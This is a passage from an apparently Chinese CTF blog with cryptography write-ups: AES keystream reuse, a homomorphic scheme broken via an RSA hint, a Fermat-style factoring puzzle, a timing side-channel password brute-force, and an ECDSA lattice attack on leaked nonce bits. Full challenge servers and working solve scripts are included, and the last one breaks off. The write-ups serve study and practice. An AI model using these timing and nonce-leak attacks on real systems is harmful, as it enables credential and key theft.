^ R[i // 4] self.RoundKeys[i].append(byte) for j in range(1, 4): byte = self.RoundKeys[i - 4][j] \\ ^ Sbox[self.RoundKeys[i - 1][(j + 1) % 4]] self.RoundKeys[i].append(byte) else: for j in range(4): byte = self.RoundKeys[i - 4][j] \\ ^ self.RoundKeys[i - 1][j] self.RoundKeys[i].append(byte) # print self.RoundKeys def encrypt(self, plaintext): self.plain_state = t2m(plaintext) self.__add_round_key(self.plain_state, self.RoundKeys[:4]) for i in range(1, 10): self.__round_encrypt(self.plain_state, self.RoundKeys[4 * i : 4 * (i + 1)]) self.__sub_bytes(self.plain_state) self.__shift_rows(self.plain_state) self.__sub_bytes(self.plain_state) self.__add_round_key(self.plain_state, self.RoundKeys[40:]) return m2t(self.plain_state) def __add_round_key(self, s, k): for i in range(4): for j in range(4): s[i][j] ^= k[i][j] def __round_encrypt(self, state_matrix, key_matrix): self.__sub_bytes(state_matrix) self.__shift_rows(state_matrix) self.__mix_columns(state_matrix) self.__add_round_key(state_matrix, key_matrix) def __sub_bytes(self, s): for i in range(4): for j in range(4): s[i][j] = Sbox[s[i][j]] def __shift_rows(self, s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3] def __mix_single_column(self, a): # please see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xc(a[0] ^ a[1]) a[1] ^= t ^ xc(a[1] ^ a[2]) a[2] ^= t ^ xc(a[2] ^ a[3]) a[3] ^= t ^ xc(a[3] ^ u) def __mix_columns(self, s): for i in range(4): self.__mix_single_column(s[i]) def xor(a,b): assert len(a) == len(b) tmp = [] for i in range(len(a)): tmp.append(a[i]^b[i]) return bytes(tmp) def exchange_plain(plaintext): new_plain = [] for i in plaintext: new_plain.append(i\u0026lt;\u0026lt;1) new_plain = bytes(new_plain) return new_plain def block_encrypt(plaintext,key,iv): aes = myAES(key) block = len(plaintext)//16 new_plain = exchange_plain(plaintext) cipher = b\u0026#39;\u0026#39; for i in range(block): iv = aes.encrypt(iv) cipher += xor(iv,new_plain[16*i:16*i+16]) return cipher 这道题，给出的块加密使用的 key 和 iv 都是在初始化阶段内容中就已经固定了的，在一次连接之中不会更改\n连上去可以获得flag的密文，那么如果是CFB或者OFB模式的加密那么该题违反了一次一密的(OTP)原则\n对于密钥流复用，我们一点点试就可以了\nOFB\nCFB\n总的来说，都是\n的形式\nsolve # from pwn import * from Crypto.Util.number import * from hashlib import sha256 import string from pwnlib.util.iters import mbruteforce table = string.ascii_letters+string.digits def pow(): io.recvuntil(\u0026#34;XXXX+\u0026#34;) suffix = io.recv(16).decode(\u0026#34;utf8\u0026#34;) io.recvuntil(\u0026#34;== \u0026#34;) cipher = io.recvline().strip().decode(\u0026#34;utf8\u0026#34;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=\u0026#39;fixed\u0026#39;) io.sendlineafter(\u0026#34;XXXX :\u0026#34;, proof) def pad(m): padlen = 16 - len(m) % 16 return m + padlen * bytes([padlen]) def enc(plaintext): print(io.recvuntil(b\u0026#39;[-]\u0026#39;).decode()) io.sendline(b\u0026#34;2\u0026#34;) print(io.recvuntil(b\u0026#39;[-] \u0026#39;).decode()) io.sendline(plaintext) io.recvuntil(b\u0026#34;CipherText:\u0026#34;) c = io.recvuntil(b\u0026#39;[+]\u0026#39;)[:-4] return c def xor(msg1,msg2): assert len(msg1)==len(msg2) return long_to_bytes(bytes_to_long(msg1)^bytes_to_long(msg2)) if __name__ == \u0026#34;__main__\u0026#34;: io = remote(\u0026#34;127.0.0.1\u0026#34;,10004) pow() print(io.recvuntil(b\u0026#39;[-] \u0026#39;).decode()) io.sendline(b\u0026#34;1\u0026#34;) print(io.recvuntil(b\u0026#34;My Encrypted flag is:\u0026#34;).decode()) c = io.recvuntil(b\u0026#39;[+]\u0026#39;)[1:-4] cipherlen = len(c) - 1 fakeplain = cipherlen * b\u0026#39;\\x01\u0026#39; blocksize = cipherlen//16 newcipher = enc(fakeplain) fakeplain = pad(fakeplain) new_plain = [] for i in fakeplain: new_plain.append((i)\u0026lt;\u0026lt;1) new_plain = bytes(new_plain) s = (xor(new_plain,newcipher[:])) fakeplain2 = (xor(s,c)) new_plain = [] for i in fakeplain2: new_plain.append((i)\u0026gt;\u0026gt;1) new_plain = bytes(new_plain) print(new_plain) MyCryptoSystem # 阿巴阿巴，摸了，一中午时间搞不定捏，下午还要上机\nfrom Crypto.Util.number import* import random from secret import flag from hashlib import sha256 import socketserver import signal import string def trans_flag(flag): new_flag = [] for i in range(6): new_flag.append(bytes_to_long(flag[i*7:i*7+7])) return new_flag kbits = 1024 table = string.ascii_letters+string.digits flag = trans_flag(flag) def Setup(kbits): p_bit = kbits//2 q_bit = kbits - p_bit while 1: p = getPrime(p_bit) p_tmp = (p-1)//2 if isPrime(p_tmp): break while 1: q = getPrime(q_bit) q_tmp = (q-1)//2 if isPrime(q_tmp): break N = p*q while 1: g = random.randrange(N*N) if (pow(g,p_tmp * q_tmp,N*N) - 1)%N == 0 and (pow(g,p_tmp * q_tmp,N*N) - 1)//N \u0026gt;= 1 and (pow(g,p_tmp * q_tmp,N*N) - 1)//N \u0026lt;= N - 1: break public = (N,g) return public,p def KeyGen(public): N,g = public a = random.randrange(N*N) h = pow(g,a,N*N) pk = h sk = a return pk,sk def Encrypt(public,pk,m): N,g = public r = random.randrange(N*N) A = pow(g,r,N*N) B = (pow(pk,r,N*N) * (1 + m * N)) % (N * N) return A,B def Add(public,dataCipher1,dataCipher2): N = public[0] A1,B1 = dataCipher1 A2,B2 = dataCipher2 A = (A1*A2)%(N*N) B = (B1*B2)%(N*N) return (A,B) def hint(p): _p = getPrime(2048) _q = getPrime(2048) n = _p*_q e = 0x10001 s = getPrime(300) tmp = (160 * s ** 5 - 4999 * s ** 4 + 3 * s ** 3 +1) phi = (_p-1)*(_q-1) d = inverse(e,phi) k = (_p-s)*d enc = pow(p,e,n) return (tmp,k,enc,n) class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;SERVER \u0026lt;INPUT\u0026gt;: \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(20)])).encode() sha = sha256(proof).hexdigest().encode() self.send(b\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:] + b\u0026#34;) == \u0026#34; + sha ) XXXX = self.recv(prompt = b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def handle(self): proof = self.proof_of_work() if not proof: self.request.close() public,p = Setup(kbits) signal.alarm(60) pk = [] for i in range(6): pki,ski = KeyGen(public) pk.append(pki) msg = [123,456,789,123,456,789] CipherPair = [] for i in range(len(pk)): TMP = Encrypt(public,pk[i],msg[i]) CipherPair.append(((TMP),pk[i])) CipherDate = [] for i in range(len(pk)): CipherDate.append(Add(public,Encrypt(public,pk[i],flag[i]),CipherPair[i][0])) self.send(b\u0026#39;What do you want to get?\\n[1]pk_list\\n[2]public_parameters\\n[3]hint_for_p\\n[4]EncRypt_Flag\\n[5]exit\u0026#39;) while 1: option = self.recv() if option == b\u0026#39;1\u0026#39;: self.send(b\u0026#34;[~]My pk_list is:\u0026#34;) self.send(str(pk).encode()) elif option == b\u0026#39;2\u0026#39;: self.send(b\u0026#34;[~]My public_parameters is\u0026#34;) self.send(str(public).encode()) elif option == b\u0026#39;3\u0026#39;: self.send(b\u0026#34;[~]My hint for p is\u0026#34;) self.send(str(hint(p)).encode()) elif option == b\u0026#39;4\u0026#39;: self.send(b\u0026#39;[~]What you want is the flag!\u0026#39;) self.send(str(CipherDate).encode()) else: break self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() Refer：\nhttps://link.springer.com/book/10.1007%2Fb94617 有点全同态的意思，思路应该都差不多，老年人审不动代码了\nsolve # from Crypto.Util.number import * pk = [ 9903345546233406345274390216048265052622725595643911382459514293327907995763783433147838863218937316798528321748709369866569364258411991106643258574989572698239199587284255395798614346448471824851838611865337708256660691836153845389605039594319342717738584309592542607252862142218328138475660803285763968213588394528744053027073152049126506763299065229583353619501424333169829170062395149103651329694449221315641100954836434060049710046515370320763518422757259232374856682888632529561315692561552616649850830047862626833700857587886906774837245010908976175065773850953572418920037258016988361625314499467080329947834, 4657987514327931382586065476207522772971258290989872695879544239943902837884205892985114988879105147508471426477725785278489578603238865417098282642677702682558515261983265111905752045094339807685437631424315910160691213278435428566562930439156460282707569924593158395598671318460018264391187530476992919637306573650359751555942532258246978276100316266002757890715569420913869805217560217134510519346377418614486773028307378572957516734818473041775035754849881665094508458497419054187487268190726118233936603633638471145845999136306136647043157332984411178327008942140608992928610672350874409133847619495978691003983, 7152622146034039999102209659831462740324099991262599130951339134800860469219385611290178799376661722659467449321426175020317292072406471009110088250342445514154276439873731324377138630287652938447079493334481729733399579524933508791782450534231737861241986084043058279901605377263189163625776405289654862504323255599291057684909554237875294477643638400289810490222526085038484864459087125794097728967487662164428457600296095735630725252693027342870722549061819169935860921269104894144054734690002817578317664544134682313233240526480877455943937633095468303194749422586696801627436494347930469704062764072900721232548, 7109779273286288048422281478804269058000170220987326969272411328526909689353334022202761918717633450003773894926300727763953889207715377450335730309751197006520012868095728483075579533219462901668068782447412894870775590238751905671507645068125478347626639590964901574834959983618787306511470121467436989932815779239653115530532446769723177935466135060247074247928491194578344816554353261469294754488631361381078861128074887053925809483235131348049560238616364665057176559180859329509474653282715138146826654691223610824931487517489362866512293278790312452574896436150893275394629547641444721163364866744442609573336, 7013605482466599504215631908713721046317718409278569099893184473489373835086487268247053290346460889649268221380299871646123742986014194382973645546664516341392101622320165115690109134132599946593167293726028899310932600936819760645652261283663993530694302054668286992858073658208217032520244670566118947000884035935625925585375773268470663092328626392488631056760673984746371429897537785286259074077658212766702133795429225879795772702881120673021514373788313589716773325607907621831363437568961397189016495389255827603389591886876630344786847409531508107276526897772978948736479662903818836257353212222762336597842, 4806721251332604936583783100910738385093145269860713974606137000339320309313718310646996553451884286724915427107907524634556622320710583584822842418207893426969244662819580085418538670391877263926570368207843244161385729568080850388644996006667177570562488502257438937466251161234759102309530753153103743200173924429409773543762996308591888655566867525229785743476821619151400424309747726050575041627943897750153111818448811385038416912000573298056564339492261814303206364521764204436008885844987333383021967216866126804296346352232953195581868834806336897980493190883504556027965801104592918053461903544343499793148] pp = ( 116058145608385674276672702733893672956917357809340972538570485852695265863484647565483969096692688010826897645583250179342948573711209724577479990992353280882942137887382013678270315267433526273541196683333653359064888776962783810251136593744944176853011420616507243827538789682910216231628628642669601620197, 1323504804693605855191327443760086345281649229726269111925168787721095025354939523351093646120270955977932471982770625541648435290075746193431150770845139326096348863253122005228642568047448855041631516254485716898369011414099219540232164217042223770732057949218835774974444493789502265425791610604673305652047727570396368311258661773456561780033017199975954989495183950216887552362300470021672023164588797459958072321188375419124464113413271301788579119298216918506641731413551008233009777669881314925772595092716344426679130709454192219868031884699258375512868095144714176573965706489293593500326194562659653969458) hint = ( 3304509274524412540171264358124119088833800976282457766193314963305873033161330887473610701496331727440513718090072303043520886293193462950873554113640228240224124433475441227891344247665419958809785016703063382485354461032693344779418991821542568461754389960108428352247981608899460343162110878318981398514231521555009134803445563830931241367613010673484820004826742929263786069863767135614670210943375086531462135790577385826251711826956133897596282243, 18673552355026493682367993197594041685105912554496204006071318337433750748484198918999006603609070236946794406646857929858271667161159821948643461587573309938436022907905563675893493544137760269437082632764159499720652999895637785568626919233056222688894682434212287149137672927486675552931963662505820165969260332655913416992181107410361559298420835898842186213690962374197086970672645328840383254461784517784780864111625152257285743741377246185357414383169045966336855033328995108673937471012241768717137091699706888762787881023600876751379445077298974464957282953933633278819938276469242913645327826899280730378510831893678633686326067596094217688170054369461965105625780401612104533404625397536763720217428564215968405635508712008844542236283094192295732557282230905545840906632840009978007258478459365608215939033972105748737935689371789627988971740974016203717802975023788606268882962377491740960659808878888064715022917962036921078185337788188828827560750328462479969002281238743276353625438159553170772284740537095985838278172254013674247239470266176189688697125522141751881011405920598024214587381076120444370591846992414608682429746316750727122762979926721420808841162691202812455865023677898835926775902048207423004038897059826740331422462081975344727266724533279470011913633242411494155377901129954948980432938310133971389286531625924644619420043095791394754413875398146297583377962248627741212161303069981941569866944074879499723223751021923981415814664672164190239644127148353124450639473123151046004159881650568067549888897471830276776633029695063826990630398201263925250452965401918712445937288291276956166559477365872979519731483611497593803953363019529897948397338298832801417548743615088306206142876669755008937934689940302481383802561001644113621155496827135409662730409037898943078891337579488375518035794171905834626304322444694, 539377906599424907526632843166406186887994388288395247025677144511569324590324166349932358956945530482435011767601209547968477063774490960749034860906510588252104413420941733125967525475043221168756505292522601577057218771125772685733296338522363178984864495675414130791619818890366370557675326005258390297594292831359088537078656773489065102417473480178237120474398129190736614740095486323803477825764714579797487965970125462158351531803287630303556152941144529035877182222332859272963419562743124506553238333107168737543087680258179370723432262945716883858929178735267308369044505783745182741491958523354179513018857096826520453169699127158441377257448188678204993164831215068755599442400473937072589097943431330269080643575456825957862621837176273757555174664101928305295704140917190943907845610548594061039034810294061809981907459259888820996892671481897701236041260611950043463091395858960542584227353654109383849840291308218862529006542917504664716472128390359084763925098770711610788290622962907016008535400120027033905191127470206070423441540259944787758643369312060605925413027755134600754634776476816867075412026307691016441255799159826836710912465972283668124709418672925573497481469507767821018983331413830308225249670213, 771303616051246597362775631900799039403496855240545309388039239713515343324730245355385505175052264662225716867664932661179695239976689945202466354113882887785256123500397817446363928952385349720106805723398880158118530637817328419529810918253166105130572407675868533684722690701263027695057884781572005203710380389492337464706322197156332747141737567696942141557244601594450697569317561198633787265360908016943129048658517482780709873483395196165037089762085272676446233125576546801464300403172738727818739368290767604363354842370759828029956787539488976004277286939183192793995718557020159731981638723547110532088324527518198313950639459543804840939790334808699633063597436840087738271170775240338399829681169080915374347348793605099404690101311868508864356243014172245954247143538079675646203655046049549064125322505821306915855626027754226417532505315799505040998439588290594143118470042253509832524845224911601112190904726230912309817509408264025187673852524716993402306088622806621715736676790401579697069312650629611634465456687035568440558258548547180371086392877863527742881461641884074483579391836421145981167932451527973965904138695962954324595990655760219255358121458470950021891974378425618763709685740211924807012197107) enc = [( 2370749863764972469554987128423083132152741020419238456792199956271338793369703079791129095737616003377516787283096306824061503011677428843457108641844447745003806414353879288703818779487783955229942181920152588250200669054504452218107095850722768505991162394104886525200011421355381962826397885692150120244491531539377531866284584252422892309748011247515811550244392155248279678705299157537079588584781118082321447337527598026964754363320992168148072800954886229060629354492679636656754286873086972322060862979794720152370297379178231399705112629407022082772459000129648242752712149593022848240307229599933472326639, 10629950550426941565735942536153612126197075426453505801699488530948416427388341145614894540703007927177589576195791501426919155687969896393612899952331105630117997308653329395856690066181874393591881894453952869877799692000865157650370029152823033681542597277374455515630326185288969181207049278972424924124917280845385999799481752211943822401232496627640731964698440335637339531240277243009697942776518858825759945763928468912578631650445582450477310960248021693355312415701840017992455266308763927053090663891585787512051382596977251121622452266044626384323834901483016613229807405392686302206337745279574799725645), ( 8542751637884684025319786450527032227009617479414394231919844939217652338788161470233642473581019170622701720476025009092989013870995959272934965586486840055645006446711683509118553167874426553788648476906001713844361905026951473754320948536863270405442355445689090656080870055731787592798342434870295612231106938988844575221665180789028833163353823895142662603464032381483430210539747595577423739584974097527545540375158029450966706494122549444092584635666880572007044982041658609028110690639268383842637227465891773307663549588908675683344647203385483408274703330184009244117626337442195205480475459017506908378382, 2085464782488608613105478863522869688839446373807422195811803331689394753034371063243583106866586343146531749675569189096780488423721634377236415215284877254947163786418624603900665408073101524722245655198842608618980378770280851746286699343613279939871217219082251933210754404379200901319663736745457626874556188300478654812086483681270689360875895659386846755725802972602048228910282786705793739781283712745503244516889112081931069096299064296710777871729670616642875966694256394184177030901697579198250012643883583860976015695050327069588050903408271139834868592068346344594302367420008530215145642134089913952557), ( 543379651794527156062094782615415987126871620097692229765839746265851208613317355119559668303271787419759988860329095755697435256473567826557245034346459936922682845797773645705160147104133662578144309856704479439289163136941011188877597285072682519886521870892631481613475471998069980876386882958669921110348676779465364405081731380722964576478311374454355160040908216697066270729949487583602342578399647457482050413820300137877454944632271598565235769295077747277719043188373569056439162575396512455806377433545271124528925620470920962892894249748487897779327141712239684724085201311734710383690195147053140764504, 9600165348259661124956404845736396858100519318389925868606888916984643985895386306780982368751778369806274791090833545087200109007614498245855188283074902307949807130479277113285297867794858711826951638363843607817932591111690370962454818512651391989642966123695165335863937606726713692914497273424773388437855020945354376617719527751214041931945111308814001172921038464366498230491013737383072831557104712383544399543012036163649490354003100371174810574006002644174234692655781715586368884960284084967731443156537638580405037295061504085273546300354900099908765784319131236423563368794213970198902823051776517828468), ( 12720343660076569556039596264810303540914689089267418571274368608634502718903963112327879610372603745751539474798195515336467050718375929419345733113911528358484167664963503186841785910027555371478552531495995844268225519704711001985099721356627657840167984002486330570582837406734000720783811150194191002449217705383562675444044945162334756814642251675950438968558499867686939667519299824614533209923956050684477257790445925094911660288187792056096062118083793213147868094394231992192383502108218624286840281922749640371120549106693515481691153295118333950838764473539401082016498358430567956598359917829161043821923, 4650323688588415339019928507804235509220831574748530492223503896814273549337012004014746825250262647080845945994043124954184595880222369378843745537963920765086225346591138786702843017155046291724096922328898328762663213011679875702138741764070774196464897663069143841855764208571026489169132412285776494336297720866132075198429444247196211613036311318314879852868477516679485900845328688901789016225902686170650744766395837690968708316279220636380532088975733777486547226356583429833361452246099636637189734339178241917792021598852161212173979461617456855465936599590284629977902176162000058610035695794065634100639), ( 10396423324897848835409665024677718748748275152542630135546271217978894933756975222671676528440868558146062940715117417453570039212594054647284966702987699660365789971324359154387594924406035801798108650969994651017387528389546784219757728821861009799685768626296589321049051322128571853402725165039936147958562122051637969655142188175452657583158785607562742670990899569674380956330989338377933120635140041105086765896268409172931140656723857868697634702294188534131288843222666037473712998513917783662683841747851217148640555307904431378526795971269753578248986461126093686958140302691940282614769028716224500465400, 10798504168395710787960812876356437285934683803323132830688595372752190494161652829029608445088132125185307268912072641282834290673164295328663953059468256952098951333672231933874502144395072869385220758235319321235155734059642693343763727507971442564909780155636668388696682838764136330992117816596893267196341561066485523081399699619635261170621994915700709742698285689917591029680117943213992352450943218840907244087863115086611479482597679053688944172466634936583338987025301834861645019455669785648445946091342899676952875789185642046350945969242055986671135076879652075682156184614411942863144182851932824842223), ( 6024146563091378683361400585005798994618396955430739256202274414470382614885386935565909835642987305321627688396325616582250978022048902486972239421247523958404794423154859667551329588342537025329667423441363580369169495567970964773693968820126919761419804174567010888728316915168649562127178777376355308064502139123147221947023574172487891669271681846950161748490575086030511122210151190204591379378553678990922119342011478603434071107786918375396663987961758147555293906382425151887060043190720507983485158382548174693081995619844700045348077449835099793967697120736717935383288578127456179213311919161151155174824, 4870502348403192237841744837214583690478227756212766589818598939047582028006298907136620265317438054467335452744116591470143951540556270271380332391795537714716300381577136060628725987549313679113315820130730138650199102902669460738279230412746309056896412027404174717090688033608047192772110096729558448093593198119502746076283713950634532742154889796648667924689635484547336377813437723995975643927939980093528839639771421922806898920769585362627963378567719717948703184928020874906392869582921471386283254630748177578173599118834216729254666298122543633678959357415931927763356558249437476070464496258411089399963)] l = 0 r = 1 \u0026lt;\u0026lt; 300 while True: s = (l + r) // 2 x = (160 * s ** 5 - 4999 * s ** 4 + 3 * s ** 3 + 1) - hint[0] if x \u0026gt; 0: r = s elif x \u0026lt; 0: l = s else: break _p = GCD(pow(2, hint[1] * 65537 + s - 1, hint[3]) - 1, hint[3]) _q = hint[3] // _p d = inverse(65537, (_p - 1) * (_q - 1)) p = pow(hint[2], d, hint[3]) n = pp[0] q = n // p k = (p - 1) * (q - 1) // 4 g = (pow(pp[1], k, n * n) - 1) // n msg = [123, 456, 789, 123, 456, 789] flag = b\u0026#39;\u0026#39; for i in range(6): y = (pow(pk[i], k, n * n) - 1) // n x = y * inverse(g, n) % n m = pow(enc[i][1], k, n * n) * pow(enc[i][0], -k * x, n * n) f = ((m - 1) // n * inverse(k, n) - msg[i]) % n flag += long_to_bytes(f) print(flag) fermat\u0026rsquo;s revenge # 小数学题\n重新模p，需要对指数变形\n对上式和n求gcd即可。\nfrom Crypto.Util.number import * n = 17329555687339057933030881774167606066714011664369940819755094697939414110116183129515036417930928381309923593306884879686961969722610261114896200690291299753284120079351636102685226435454462581742248968732979816910255384339882675593423385529925794918175056364069416358095759362865710837992174966213332948216626442765218056059227797575954980861175262821459941222980957749720949816909119263643425681517545937122980872133309062049836920463547302193585676588711888598357927574729648088370609421283416559346827315399049239357814820660913395553316721927867556418628117971385375472454118148999848258824753064992040468588511 c = 2834445728359401954509180010018035151637121735110411504246937217024301211768483790406570069340718976013805438660602396212488675995602673107853878297024467687865600759709655334014269938893756460638324659859693599161639448736859952750381592192404889795107146077421499823006298655812398359841137631684363428490100792619658995661630533920917942659455792050032138051272224911869438429703875012535681896010735974555495618216882831524578648074539796556404193333636537331833807459066576022732553707927018332334884641370339471969967359580724737784159811992637384360752274204462169330081579501038904830207691558009918736480389 hint = 2528640120640884291705022551567142949735065756834488816429783990402901687493207894594113717734719036126087363828359113769238235697788243950392064194097056579105620723640796253143555383311882778423540515270957452851097267592400001145658904042191937942341842865936546187498072576943297002184798413336701918670376291021190387536660070933700475110660304652647893127663882847145502396993549034428649569475467365756381857116208029508389607872560487325166953770793357700419069480517845456083758105937644350450559733949764193599564499133714282286339445501435278957250603141596679797055178139335763901195697988437542180256184 p = GCD(hint-pow(1011, n, n), n) q = n//p d = inverse(65537, (p-1)*(q-1)) print(long_to_bytes(pow(c, d, n))) 'flag{1d2f28834ecbd1983b62d30f4723476e}'\n第二届美团ctf预赛romeo # 操作系统终于考完了，抽空看了下这个完全没有营养的线上赛\nfrom Crypto.Util.number import* from Crypto.Cipher import AES from secret import msg,password,flag import socketserver import signal assert len(msg) == 32 assert len(password) == 8 def padding(msg): return msg + bytes([0 for i in range((16 - len(msg))%16)]) class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self): return self._recvall() def login(self): right_num = 0 while 1: self.send(b\u0026#39;[~]Please input your password:\u0026#39;) str1 = self.recv().strip()[:8] print(str1) print(password) true_num = 0 for i in range(len(password)): if str1[i] != password[i]: login = False self.send(b\u0026#39;False!\u0026#39;) break else: true_num = i + 1 if right_num \u0026gt; true_num: continue else: right_num = true_num if true_num == len(password): login = True check = b\u0026#39;\u0026#39; for i in range(0x2000): check = self.aes.encrypt(padding(check[:-1] + str1[:i+1])) if login == True: self.send(b\u0026#34;Login Success\u0026#34;) return True,check[:16] return False def handle(self): signal.alarm(100) self.aes = AES.new(padding(password),AES.MODE_ECB) _,final_check = self.login() if _ == 1: 这个assert完全没有什么鸟用 # assert msg.decode() == final_check.hex() self.send(b\u0026#39;Good Morning Master!\u0026#39;) self.send(flag) class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10001 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 一位位爆破密码\n通过range(0x2000)的高耗时来判断当前正在判断的位数\nfrom pwn import * from time import time import string #io = remote(\u0026#34;127.0.0.1\u0026#34;, 9999) io = remote(\u0026#34;0.0.0.0\u0026#34;, 10001) CHARSET = string.printable pre = \u0026#34;\u0026#34; for _ in range(8): print(_) t = 0 now = \u0026#34;\u0026#34; for i in CHARSET[:]: io.recvuntil(b\u0026#34;:\u0026#34;) print(pre + i + \u0026#34;0\u0026#34;) io.sendline((pre + i + \u0026#34;0\u0026#34;).encode()) start = time() # 等待 \u0026#34;False!\u0026#34; io.recvuntil(b\u0026#34;!\u0026#34;) end = time() # 出现错误的时间大于上一次出现错误的时间 # 证明当前字符才对了，正确的序列又变长了一位 if (end - start) \u0026gt; t: now = i t = end - start print(end - start) print() print(t) #exit() pre = pre + now print(pre) io.interactive() 最后拿到passwd了nc上去输入拿到flag\n","date":"14 November 2021","permalink":"/achieve/%E5%A4%8D%E7%9B%982/","section":"archive","summary":"","title":"闲题杂记2"},{"content":" 阿巴阿巴，周末白天忙了一整天学校的事，晚上挂机跑了一晚还是没跑出来捏\nEzECDSA # This challenge use SECP256k1 curve to generate the generator ec system\nwe get 100 sets of signatures and the task.py tells us the low-8bits of K\nleak：$kp = K;mod;256$\nand question-44644 on stackexchange says its a problem of Elliptic Curve Digital Signature Algorithm with Partially Known Nonces\nIn there，known nonce is low-8bits\nThe idea is to convert the determination of a private key from biased k nonces in several ECDSA signatures into instances of the hidden number problem (HNP), and then solve the HNP as a reduction to the closest vector problem(CVP).\nAt least ,we kwon we can turn sequence S into a Linear structure\nand the answer also tells us,how to turn the equation in a HNP\nyou can write k as\n$k = a + 2^\\ell b$\nthen\nperfect,without any problem\nDefine\nand you have\n$xt = u + b$\nconstruct sequence\nThen,construct a matrix out of basis vectors:\nwhich from this article\nso,we should to find a beautiful B ,Then make\n$S_T=B/p$\n$S_U=B$\nand if you are palying with a good luck\nmost likely, you\u0026rsquo;ll see the next-to-last entry of next-to-last row containing a dA or -dA\nunfortunately，the lattice in paper seems not very efficient\nand @BitLogiK gives a efficient way to make the boundary valid\nHis way of constructing denotation:\n$T_i=2\\cdot2^{\\ell}\\cdot \\frac{R_i}{2^{\\ell}\\cdot S_i} ;mod;n$\n$U_i=(2\\cdot 2^{\\ell}\\cdot \\frac{KP_i-H_i}{2^{\\ell}\\cdot S_i} ;mod;n)+n$\n$Q\u0026rsquo;=2\\cdot 2^{\\ell}\\cdot n$\n$C_t=1$\n$C_u=q$\nnew lattice looks like this:\nthen,the privacy will lay in next-to-last col\nObviously,I\ndef test_result(mat, target_pubkey, curve): mod_n = ecdsa_lib.curve_n(curve) for row in mat: candidate = row[-2] % mod_n if candidate \u0026gt; 0: cand1 = candidate cand2 = mod_n - candidate if target_pubkey == ecdsa_lib.privkey_to_pubkey(cand1, curve): return cand1 if target_pubkey == ecdsa_lib.privkey_to_pubkey(cand2, curve): return cand2 return 0 solve # recv data into a jsonfile and set lattice_attack.py options and get flag by hand\nor copy others code to have a happy day 😀\n#! python3 import icecream import string from icecream import * from pwnlib.util.iters import mbruteforce from pwn import * from hashlib import sha256 from tqdm import tqdm from rich.progress import track from rich.traceback import install install() # ----------------------------------- table = string.ascii_letters+string.digits from Crypto.Util.number import * io = remote(\u0026#39;0.0.0.0\u0026#39;,23331) def gopow(): s=io.recvuntil(\u0026#34;XXXX+\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) s=io.recvuntil(\u0026#34;)\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) suffix=s[:-1] s=io.recvuntil(\u0026#34;==\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) s=io.recvuntil(\u0026#34;\\n\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) cipher=s[1:-1].decode() ic(cipher) ic(suffix) # ic(\u0026#34;AAAA\u0026#34;.encode() + suffix) # ic(sha256(\u0026#34;AAAA\u0026#34;.encode() + suffix).hexdigest()) proof = mbruteforce(lambda x: sha256(x.encode() + suffix).hexdigest() == cipher, table, length=4, method=\u0026#39;fixed\u0026#39;) ic(proof) io.sendlineafter(\u0026#34;Give me XXXX:\u0026#34;, proof) gopow() pubkey=eval(io.recvline()) data={} from tqdm import tqdm from os import system data[\u0026#34;curve\u0026#34;]=\u0026#34;SECP256K1\u0026#34; data[\u0026#34;public_key\u0026#34;]=[pubkey[0],pubkey[1]] #data[\u0026#34;message\u0026#34;]=\u0026#34;0\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) data[\u0026#34;known_type\u0026#34;]=\u0026#34;LSB\u0026#34; data[\u0026#34;known_bits\u0026#34;]=8 data[\u0026#34;signatures\u0026#34;]=[] for i in tqdm(range(100)): io.recvuntil(\u0026#34;ge:\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) io.sendline(\u0026#34;0\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) io.recvuntil(\u0026#34;r =\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) ( ()) r=int(io.recvline()) io.recvuntil(\u0026#34;s =\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) s=int(io.recvline()) io.recvuntil(\u0026#34;kp =\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) 